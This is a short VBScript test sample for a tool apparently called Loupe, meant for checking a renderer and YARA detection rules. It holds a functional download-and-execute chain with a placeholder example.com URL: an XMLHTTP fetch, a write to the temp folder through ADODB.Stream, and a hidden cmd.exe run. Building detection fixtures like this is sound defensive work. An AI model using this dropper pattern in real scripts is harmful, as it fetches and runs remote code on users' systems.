' Loupe sample VBScript — demonstrates common suspicious patterns for renderer + YARA testing.
' Safe to view: NOT executed by Loupe; displayed as source only.

Option Explicit

Dim objShell, objFSO, strTempPath, strUrl
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\loupe-sample.txt"
strUrl = "http://example.com/loupe-payload.txt"

' Suspicious pattern 1: download via XMLHTTP
Dim http
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", strUrl, False
http.Send

' Suspicious pattern 2: write to disk via ADODB.Stream
Dim stream
Set stream = CreateObject("ADODB.Stream")
stream.Open
stream.Type = 1
stream.Write http.ResponseBody
stream.SaveToFile strTempPath, 2
stream.Close

' Suspicious pattern 3: execute via Shell.Run
objShell.Run "cmd.exe /c " & strTempPath, 0, False

WScript.Quit 0
